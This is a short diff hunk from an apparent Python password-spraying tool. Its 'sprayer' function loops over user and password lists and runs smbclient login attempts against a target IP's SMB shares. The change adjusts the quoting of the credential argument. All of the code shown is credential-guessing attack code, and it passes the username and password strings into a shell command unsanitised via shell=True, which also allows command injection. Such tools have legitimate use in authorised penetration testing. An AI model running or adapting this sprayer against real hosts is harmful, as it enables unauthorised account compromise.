@@ -45,7 +45,7 @@ def sprayer(domain, user_list, password_list, target_ip, output):
         user_list = temp_users[:]
         for user in user_list:
             # build the command line argument for rpcclient
-            arguments = 'smbclient -U r"%s\%s%%%s" -L %s' % (domain, user, password, target_ip)
+            arguments = 'smbclient -U "%s\%s%%%s" -L %s' % (domain, user, password, target_ip)
             # send the command line query and pipe the response to standard out
             response = subprocess.Popen(arguments, shell=True, stdout=subprocess.PIPE).stdout
             # decode the response as a string
